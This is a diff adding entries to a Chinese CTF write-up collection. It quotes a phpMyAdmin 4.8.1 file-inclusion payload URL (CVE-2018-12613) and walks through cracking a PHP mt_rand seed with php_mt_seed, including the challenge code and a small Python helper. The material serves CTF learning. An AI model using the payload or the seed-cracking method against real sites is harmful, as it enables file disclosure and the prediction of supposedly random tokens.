@@ -48,3 +48,41 @@ if (isset($_POST['password'])) {
 ### 7.[GWCTF 2019]我有一个数据库
     phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）
     漏洞payload：http://yourip:port/phpmyadmin/index.php?target=db_sql.php%253f<你的文件路径>
+### 8.[RoarCTF 2019]Simple Upload
+    条件竞争漏洞，有待分析
+### 9.[GWCTF 2019]枯燥的抽奖
+    php的伪随机数漏洞
+网页源代码：
+```php
+header("Content-Type: text/html;charset=utf-8");
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
+}
+
+mt_srand($_SESSION['seed']);
+$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+$str='';
+$len1=20;
+for ( $i = 0; $i < $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo "<p id='p1'>".$str_show."</p>";
+```
+得到Gn0qGVf5hw为随机生成的前10位，后10位不可知道
+可以使用php_mt_seed爆破，但是前提得让php_mt_seed识别这种类型的随机数，格式为数 + 数 + 最小值 + 最大值
+```python
+str1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+choose = "Gn0qGVf5hw"
+flag = ""
+for i in range(10):
+    for j in range(len(str1)):
+        if choose[i] == str1[j]:
+            flag += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' '
+            break
+print flag //42 42 0 61 13 13 0 61 26 26 0 61 16 16 0 61 42 42 0 61 57 57 0 61 5 5 0 61 31 31 0 61 7 7 0 61 22 22 0 61
+```
+    运行./php_mt_seed 42 42 0 61 13 13 0 61 26 26 0 61 16 16 0 61 42 42 0 61 57 57 0 61 5 5 0 61 31 31 0 61 7 7 0 61 22 22 0 61
+    得到338669776
+    还原20位的随机数得到flag
